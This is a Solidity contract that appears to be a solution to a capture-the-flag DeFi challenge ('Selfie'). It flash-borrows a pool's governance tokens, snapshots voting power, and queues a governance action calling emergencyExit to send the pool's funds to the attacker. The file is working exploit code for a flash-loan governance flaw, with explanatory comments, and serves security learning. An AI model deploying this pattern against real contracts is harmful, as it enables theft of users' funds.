// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
// import { SafeTransferLib, ERC4626, ERC20 } from "solmate/src/mixins/ERC4626.sol";

import "hardhat/console.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface IPool {
    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data) external;
}

interface IGovernance {
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
}

interface IToken {
    function snapshot() external;
    function approve(address to, uint256 amount) external;
    function balanceOf(address owner) external returns(uint256);
}

contract SelfieAttacker is IERC3156FlashBorrower {
    address private attacker;
    IPool private immutable pool;
    IGovernance private immutable governance;
    IToken private immutable token;

   constructor(
    address _poolAddress,
    address _governanceAddress,
    address _tokenAddress
    ) {
        pool = IPool(_poolAddress);
        governance = IGovernance(_governanceAddress);
        // We only store the token so we can get the balance on attack()
        // During the flashLoan itself we will use the token_address passed in
        // But they both will be the same thing
        token = IToken(_tokenAddress);
        attacker = msg.sender;
   }

    function attack() external {
        // We only need 50% of the tokens to have the governance rights but
        // we are just taking them all out in the flash loan for fun
        uint balance = token.balanceOf(address(pool));
        pool.flashLoan(this, address(token), balance, bytes(""));
    }

    // NOTE: I removed the variable names for the last two parameters
    // since it cleans it up
    function onFlashLoan(
        address sender, 
        address token_address, 
        uint256 amount, 
        uint256, 
        bytes calldata) external returns (bytes32) {
            console.log("entered the onFlashLoan method.");

            // The governance token looks at the last snapshot time to see the total supply
            // when determining if the person enqueuing the action passes the
            // governance check 
            IToken(token_address).snapshot();

            // Queue the action that will be later be executed by the governance smart contract 
            // outside of this smart contact
            governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", attacker));

            // The pool is going to do the transfer itself so we need to do the approve here
            // so the pool smart contact can retrieve the same amount back that was
            // loaned out
            IToken(token_address).approve(address(pool), amount);

            // This is just the return type that is expected by the pool
            return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}